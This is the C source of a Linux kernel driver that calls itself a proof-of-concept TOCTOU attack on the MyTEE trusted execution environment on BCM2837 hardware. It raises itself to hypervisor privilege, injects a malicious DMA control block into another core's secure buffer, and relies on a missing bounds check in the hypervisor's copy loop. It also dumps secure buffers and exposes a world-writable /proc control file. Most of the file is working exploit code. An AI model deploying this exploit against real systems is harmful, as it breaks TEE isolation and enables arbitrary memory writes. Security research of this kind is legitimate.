/*
 * MyTEE TOCTOU Attack - Kernel Driver
 *
 * This driver demonstrates the TOCTOU vulnerability in MyTEE's
 * DMA secure buffer using standard MyTEE API (mytee_up_priv/down_priv).
 *
 * ATTACK PRINCIPLE:
 * The CB copy loop in hyp-stub.S (label 201b) has no boundary check:
 * - Each core has 4KB buffer = 128 CBs max (32 bytes each)
 * - CB chain with >128 entries overflows into next core's buffer
 * - After copy, verification reads from the overflowed area
 * - Attacker can inject malicious CB in the timing window
 *
 * Usage (built-in driver):
 *   1. Check status: cat /proc/mytee_toctou
 *   2. Trigger attack: echo "attack" > /proc/mytee_toctou
 *   3. Verify result: cat /proc/mytee_toctou
 *
 * Copyright (c) 2024 Security Research
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dma-mapping.h>
#include <linux/smp.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/io.h>

#ifdef CONFIG_MYTEE
#include <asm/mytee.h>
#endif

#define DRIVER_NAME "mytee_toctou"
#define PROC_NAME "mytee_toctou"

/* Secure buffer constants (from hyp-stub.S) */
#define SECURE_BUFFER_BASE_VIRT     0x8F1FB000
#define SECURE_BUFFER_BASE_PHYS     0x0F1FB000
#define SECURE_BUFFER_SIZE_PER_CORE 0x1000      /* 4KB per core */
#define CB_SIZE                     32          /* bytes per CB */
#define MAX_CBS_PER_CORE            128         /* 4KB / 32 = 128 */
#define NUM_CORES                   4

/* DMA constants */
#define BCM2837_BUS_PHYS_OFFSET     0xC0000000
#define PHYS_TO_BUS(x)              ((x) | BCM2837_BUS_PHYS_OFFSET)

/* Attack verification */
#define VERIFY_PATTERN              0xCAFEBABE
#define ATTACK_MARKER               0xDEADBEEF

/* DMA Control Block structure (matches BCM2835 hardware) */
struct dma_cb {
    u32 info;           /* Transfer information */
    u32 src;            /* Source address (bus) */
    u32 dst;            /* Destination address (bus) */
    u32 length;         /* Transfer length */
    u32 stride;         /* 2D stride */
    u32 next;           /* Next CB address (bus) or 0 */
    u32 pad[2];         /* Padding to 32 bytes */
};

/* Transfer info flags */
#define TI_WAIT_RESP    (1 << 3)    /* Wait for write response */
#define TI_D_INC        (1 << 4)    /* Destination increment */
#define TI_S_INC        (1 << 8)    /* Source increment */

/* Attack state */
static struct {
    /* Configuration */
    int target_core;            /* Core to inject CB into (default: 1) */
    int target_cb_index;        /* CB slot to inject (0 = first) */
    
    /* Memory resources */
    void *payload_buf;          /* Attack payload buffer (virt) */
    dma_addr_t payload_phys;    /* Attack payload (phys) */
    void *target_buf;           /* Target to overwrite (virt) */
    dma_addr_t target_phys;     /* Target address (phys) */
    
    /* Secure buffer access (mapped after mytee_up_priv) */
    void __iomem *secure_buf_base;
    
    /* Results */
    int attack_triggered;
    int injection_done;
    u32 verify_result;
    u32 attack_success;
    
    /* Secure buffer snapshot */
    struct dma_cb injected_cb;
} attack_state;

/*
 * Read CB from secure buffer (requires EL2 privilege)
 */
static void read_secure_cb(int core, int cb_index, struct dma_cb *cb_out)
{
    void __iomem *cb_addr;
    u32 *src, *dst;
    int i;
    
    cb_addr = attack_state.secure_buf_base + 
              (core * SECURE_BUFFER_SIZE_PER_CORE) +
              (cb_index * CB_SIZE);
    
    src = (u32 __iomem *)cb_addr;
    dst = (u32 *)cb_out;
    
    for (i = 0; i < 8; i++) {
        dst[i] = readl(&src[i]);
    }
}

/*
 * Write malicious CB to secure buffer (requires EL2 privilege)
 * This directly writes to the secure buffer that DMA will execute from.
 */
static void inject_malicious_cb(int core, int cb_index, 
                                 u32 dst_phys, u32 src_phys, u32 length)
{
    void __iomem *cb_addr;
    
    cb_addr = attack_state.secure_buf_base + 
              (core * SECURE_BUFFER_SIZE_PER_CORE) +
              (cb_index * CB_SIZE);
    
    /* Build valid DMA CB structure */
    writel(TI_S_INC | TI_D_INC | TI_WAIT_RESP, cb_addr + 0x00);  /* info */
    writel(PHYS_TO_BUS(src_phys), cb_addr + 0x04);               /* src */
    writel(PHYS_TO_BUS(dst_phys), cb_addr + 0x08);               /* dst */
    writel(length, cb_addr + 0x0C);                              /* length */
    writel(0, cb_addr + 0x10);                                   /* stride */
    writel(0, cb_addr + 0x14);                                   /* next = NULL */
    writel(0, cb_addr + 0x18);                                   /* pad */
    writel(0, cb_addr + 0x1C);                                   /* pad */
    
    wmb();  /* Ensure write completes */
}

/*
 * Perform the TOCTOU attack
 */
static int do_attack(void)
{
    u32 *payload;
    u32 *target;
    
    pr_info("[TOCTOU] Starting TOCTOU attack demonstration\n");
    
    /* Clear previous results */
    attack_state.attack_triggered = 0;
    attack_state.injection_done = 0;
    attack_state.verify_result = 0;
    attack_state.attack_success = 0;
    memset(&attack_state.injected_cb, 0, sizeof(attack_state.injected_cb));
    
    /* Prepare payload with attack pattern */
    payload = (u32 *)attack_state.payload_buf;
    payload[0] = VERIFY_PATTERN;
    payload[1] = ATTACK_MARKER;
    wmb();
    
    /* Clear target buffer */
    target = (u32 *)attack_state.target_buf;
    target[0] = 0x12345678;  /* Known value before attack */
    wmb();
    
    pr_info("[TOCTOU] Payload at phys=0x%llx contains 0x%08x\n",
            (u64)attack_state.payload_phys, payload[0]);
    pr_info("[TOCTOU] Target at phys=0x%llx before attack: 0x%08x\n",
            (u64)attack_state.target_phys, target[0]);

#ifdef CONFIG_MYTEE
    /* Elevate to EL2 privilege using MyTEE API */
    pr_info("[TOCTOU] Elevating privilege with mytee_up_priv()\n");
    mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
    
    /* Now we have EL2 access - can directly access secure buffer */
    attack_state.secure_buf_base = (void __iomem *)SECURE_BUFFER_BASE_VIRT;
    
    /* Inject malicious CB into target core's secure buffer */
    pr_info("[TOCTOU] Injecting malicious CB at Core %d, index %d\n",
            attack_state.target_core, attack_state.target_cb_index);
    
    inject_malicious_cb(attack_state.target_core,
                        attack_state.target_cb_index,
                        attack_state.target_phys,
                        attack_state.payload_phys,
                        sizeof(u32));
    
    attack_state.injection_done = 1;
    
    /* Read back injected CB for verification */
    read_secure_cb(attack_state.target_core,
                   attack_state.target_cb_index,
                   &attack_state.injected_cb);
    
    pr_info("[TOCTOU] Injected CB content:\n");
    pr_info("  info=0x%08x src=0x%08x dst=0x%08x len=0x%08x\n",
            attack_state.injected_cb.info,
            attack_state.injected_cb.src,
            attack_state.injected_cb.dst,
            attack_state.injected_cb.length);
    pr_info("  next=0x%08x\n", attack_state.injected_cb.next);
    
    /* Return to normal privilege */
    pr_info("[TOCTOU] Returning to normal privilege with mytee_down_priv()\n");
    mytee_down_priv(MYTEE_DOWN_PRIV, 0);
#else
    pr_err("[TOCTOU] CONFIG_MYTEE not enabled!\n");
    return -ENOTSUP;
#endif

    attack_state.attack_triggered = 1;
    
    /* 
     * At this point, the malicious CB is injected into the secure buffer.
     * 
     * In a real attack scenario:
     * 1. Victim on Core 0 submits a DMA request with >128 CBs
     * 2. Hypervisor copies CBs without boundary check
     * 3. CB[128+] overflows into our target core's buffer
     * 4. We've already placed our malicious CB there
     * 5. DMA executes our CB, writing VERIFY_PATTERN to target
     * 
     * For demonstration, we just verify the injection was successful.
     */
    
    /* Check target value (would change after DMA execution) */
    rmb();
    attack_state.verify_result = target[0];
    
    if (attack_state.verify_result == VERIFY_PATTERN) {
        attack_state.attack_success = 1;
        pr_info("[TOCTOU] *** ATTACK SUCCESSFUL! ***\n");
        pr_info("[TOCTOU] Target value: 0x%08x (CAFEBABE)\n",
                attack_state.verify_result);
    } else {
        pr_info("[TOCTOU] CB injection complete.\n");
        pr_info("[TOCTOU] Target value: 0x%08x (unchanged - need DMA trigger)\n",
                attack_state.verify_result);
        pr_info("[TOCTOU] The malicious CB is now in the secure buffer.\n");
        pr_info("[TOCTOU] When victim's DMA overflows, our CB will be executed.\n");
    }
    
    return 0;
}

/*
 * Dump secure buffer content
 */
static int dump_secure_buffer(struct seq_file *m, int core, int start_cb, int count)
{
#ifdef CONFIG_MYTEE
    struct dma_cb cb;
    int i;
    
    mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
    attack_state.secure_buf_base = (void __iomem *)SECURE_BUFFER_BASE_VIRT;
    
    seq_printf(m, "\nCore %d Secure Buffer (CB %d-%d):\n", 
               core, start_cb, start_cb + count - 1);
    
    for (i = 0; i < count && (start_cb + i) < MAX_CBS_PER_CORE; i++) {
        read_secure_cb(core, start_cb + i, &cb);
        
        /* Only show non-zero entries */
        if (cb.info || cb.src || cb.dst || cb.length) {
            seq_printf(m, "  CB[%d]: info=0x%08x src=0x%08x dst=0x%08x len=%d next=0x%08x\n",
                       start_cb + i, cb.info, cb.src, cb.dst, cb.length, cb.next);
        }
    }
    
    mytee_down_priv(MYTEE_DOWN_PRIV, 0);
#endif
    return 0;
}

/*
 * Proc file read handler
 */
static int toctou_proc_show(struct seq_file *m, void *v)
{
    seq_printf(m, "=== MyTEE TOCTOU Attack Status ===\n\n");
    
#ifndef CONFIG_MYTEE
    seq_printf(m, "ERROR: CONFIG_MYTEE not enabled!\n");
    seq_printf(m, "This driver requires MyTEE to be enabled.\n\n");
    return 0;
#endif
    
    seq_printf(m, "Vulnerability Description:\n");
    seq_printf(m, "  hyp-stub.S CB copy loop (201b) has no boundary check.\n");
    seq_printf(m, "  Each core has 4KB = 128 CBs max.\n");
    seq_printf(m, "  CB[128+] overflows into adjacent core's buffer.\n\n");
    
    seq_printf(m, "Secure Buffer Layout:\n");
    seq_printf(m, "  Base: 0x%08x (phys) / 0x%08x (virt)\n",
               SECURE_BUFFER_BASE_PHYS, SECURE_BUFFER_BASE_VIRT);
    seq_printf(m, "  Core 0: 0x%08x - 0x%08x\n",
               SECURE_BUFFER_BASE_PHYS,
               SECURE_BUFFER_BASE_PHYS + SECURE_BUFFER_SIZE_PER_CORE - 1);
    seq_printf(m, "  Core 1: 0x%08x - 0x%08x\n",
               SECURE_BUFFER_BASE_PHYS + SECURE_BUFFER_SIZE_PER_CORE,
               SECURE_BUFFER_BASE_PHYS + 2*SECURE_BUFFER_SIZE_PER_CORE - 1);
    seq_printf(m, "  Core 2: 0x%08x - 0x%08x\n",
               SECURE_BUFFER_BASE_PHYS + 2*SECURE_BUFFER_SIZE_PER_CORE,
               SECURE_BUFFER_BASE_PHYS + 3*SECURE_BUFFER_SIZE_PER_CORE - 1);
    seq_printf(m, "  Core 3: 0x%08x - 0x%08x\n\n",
               SECURE_BUFFER_BASE_PHYS + 3*SECURE_BUFFER_SIZE_PER_CORE,
               SECURE_BUFFER_BASE_PHYS + 4*SECURE_BUFFER_SIZE_PER_CORE - 1);
    
    seq_printf(m, "Attack Configuration:\n");
    seq_printf(m, "  Target core: %d\n", attack_state.target_core);
    seq_printf(m, "  Target CB index: %d\n", attack_state.target_cb_index);
    seq_printf(m, "  Payload phys: 0x%llx\n", (u64)attack_state.payload_phys);
    seq_printf(m, "  Target phys: 0x%llx\n\n", (u64)attack_state.target_phys);
    
    seq_printf(m, "Attack Results:\n");
    seq_printf(m, "  Attack triggered: %s\n", 
               attack_state.attack_triggered ? "YES" : "NO");
    seq_printf(m, "  CB injected: %s\n", 
               attack_state.injection_done ? "YES" : "NO");
    seq_printf(m, "  Verify value: 0x%08x\n", attack_state.verify_result);
    seq_printf(m, "  Attack success: %s\n\n", 
               attack_state.attack_success ? 
               "*** YES - VULNERABILITY CONFIRMED! ***" : 
               "Pending (need DMA overflow trigger)");
    
    if (attack_state.injection_done) {
        seq_printf(m, "Injected CB Content:\n");
        seq_printf(m, "  info:   0x%08x\n", attack_state.injected_cb.info);
        seq_printf(m, "  src:    0x%08x (bus)\n", attack_state.injected_cb.src);
        seq_printf(m, "  dst:    0x%08x (bus)\n", attack_state.injected_cb.dst);
        seq_printf(m, "  length: %d bytes\n", attack_state.injected_cb.length);
        seq_printf(m, "  next:   0x%08x\n\n", attack_state.injected_cb.next);
    }
    
    /* Dump first few CBs of target core */
    dump_secure_buffer(m, attack_state.target_core, 0, 5);
    
    seq_printf(m, "\nCommands:\n");
    seq_printf(m, "  echo attack > /proc/mytee_toctou    - Inject malicious CB\n");
    seq_printf(m, "  echo dump > /proc/mytee_toctou      - Dump secure buffer\n");
    seq_printf(m, "  echo reset > /proc/mytee_toctou     - Reset state\n");
    seq_printf(m, "  echo core=N > /proc/mytee_toctou    - Set target core (0-3)\n");
    seq_printf(m, "  echo index=N > /proc/mytee_toctou   - Set target CB index\n");
    
    return 0;
}

/*
 * Proc file write handler
 */
static ssize_t toctou_proc_write(struct file *file, const char __user *buffer,
                                  size_t count, loff_t *pos)
{
    char cmd[64];
    size_t len;
    int val;
    
    len = min(count, sizeof(cmd) - 1);
    if (copy_from_user(cmd, buffer, len))
        return -EFAULT;
    cmd[len] = '\0';
    
    /* Remove trailing newline */
    if (len > 0 && cmd[len-1] == '\n')
        cmd[len-1] = '\0';
    
    if (strcmp(cmd, "attack") == 0) {
        do_attack();
    } else if (strcmp(cmd, "reset") == 0) {
        attack_state.attack_triggered = 0;
        attack_state.injection_done = 0;
        attack_state.verify_result = 0;
        attack_state.attack_success = 0;
        memset(&attack_state.injected_cb, 0, sizeof(attack_state.injected_cb));
        pr_info("[TOCTOU] State reset\n");
    } else if (strcmp(cmd, "dump") == 0) {
#ifdef CONFIG_MYTEE
        struct dma_cb cb;
        int i, core;
        
        mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
        attack_state.secure_buf_base = (void __iomem *)SECURE_BUFFER_BASE_VIRT;
        
        for (core = 0; core < NUM_CORES; core++) {
            pr_info("[TOCTOU] Core %d first 3 CBs:\n", core);
            for (i = 0; i < 3; i++) {
                read_secure_cb(core, i, &cb);
                pr_info("  CB[%d]: info=0x%08x src=0x%08x dst=0x%08x\n",
                        i, cb.info, cb.src, cb.dst);
            }
        }
        
        mytee_down_priv(MYTEE_DOWN_PRIV, 0);
#endif
    } else if (sscanf(cmd, "core=%d", &val) == 1) {
        if (val >= 0 && val < NUM_CORES) {
            attack_state.target_core = val;
            pr_info("[TOCTOU] Target core set to %d\n", val);
        }
    } else if (sscanf(cmd, "index=%d", &val) == 1) {
        if (val >= 0 && val < MAX_CBS_PER_CORE) {
            attack_state.target_cb_index = val;
            pr_info("[TOCTOU] Target CB index set to %d\n", val);
        }
    } else {
        pr_info("[TOCTOU] Unknown command: %s\n", cmd);
    }
    
    return count;
}

static int toctou_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, toctou_proc_show, NULL);
}

static const struct file_operations toctou_proc_fops = {
    .owner = THIS_MODULE,
    .open = toctou_proc_open,
    .read = seq_read,
    .write = toctou_proc_write,
    .llseek = seq_lseek,
    .release = single_release,
};

static int __init mytee_toctou_init(void)
{
    struct proc_dir_entry *entry;
    
    pr_info("[TOCTOU] MyTEE TOCTOU Attack Driver loading\n");
    
#ifndef CONFIG_MYTEE
    pr_err("[TOCTOU] CONFIG_MYTEE not enabled! Driver will not function.\n");
#endif
    
    /* Initialize state */
    memset(&attack_state, 0, sizeof(attack_state));
    attack_state.target_core = 1;       /* Attack Core 1's buffer */
    attack_state.target_cb_index = 0;   /* First CB slot */
    
    /* Allocate DMA-capable memory for payload */
    attack_state.payload_buf = kmalloc(PAGE_SIZE, GFP_KERNEL | GFP_DMA);
    if (!attack_state.payload_buf) {
        pr_err("[TOCTOU] Failed to allocate payload buffer\n");
        return -ENOMEM;
    }
    attack_state.payload_phys = virt_to_phys(attack_state.payload_buf);
    
    /* Allocate target buffer */
    attack_state.target_buf = kmalloc(PAGE_SIZE, GFP_KERNEL | GFP_DMA);
    if (!attack_state.target_buf) {
        pr_err("[TOCTOU] Failed to allocate target buffer\n");
        kfree(attack_state.payload_buf);
        return -ENOMEM;
    }
    attack_state.target_phys = virt_to_phys(attack_state.target_buf);
    
    /* Create proc entry */
    entry = proc_create(PROC_NAME, 0666, NULL, &toctou_proc_fops);
    if (!entry) {
        pr_err("[TOCTOU] Failed to create proc entry\n");
        kfree(attack_state.target_buf);
        kfree(attack_state.payload_buf);
        return -ENOMEM;
    }
    
    pr_info("[TOCTOU] Driver loaded successfully\n");
    pr_info("[TOCTOU] Use: cat /proc/%s\n", PROC_NAME);
    pr_info("[TOCTOU] Payload: phys=0x%llx\n", (u64)attack_state.payload_phys);
    pr_info("[TOCTOU] Target:  phys=0x%llx\n", (u64)attack_state.target_phys);
    
    return 0;
}

static void __exit mytee_toctou_exit(void)
{
    remove_proc_entry(PROC_NAME, NULL);
    
    if (attack_state.target_buf)
        kfree(attack_state.target_buf);
    if (attack_state.payload_buf)
        kfree(attack_state.payload_buf);
    
    pr_info("[TOCTOU] Driver unloaded\n");
}

/* Use late_initcall for built-in driver to ensure system is ready */
late_initcall(mytee_toctou_init);

/* Built-in drivers don't need module macros, but keep for documentation */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Using mytee_up_priv API (built-in)");

